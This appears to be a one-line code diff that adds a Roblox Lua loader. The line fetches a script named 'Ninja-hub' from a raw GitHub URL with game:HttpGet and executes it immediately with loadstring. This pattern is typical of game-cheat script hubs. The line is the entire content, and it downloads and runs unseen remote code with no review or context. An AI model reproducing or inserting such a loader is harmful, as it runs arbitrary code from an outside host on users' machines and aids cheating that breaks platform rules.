@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/biel99lol/Ninja-File.txt/refs/heads/main/Ninja-hub"))()
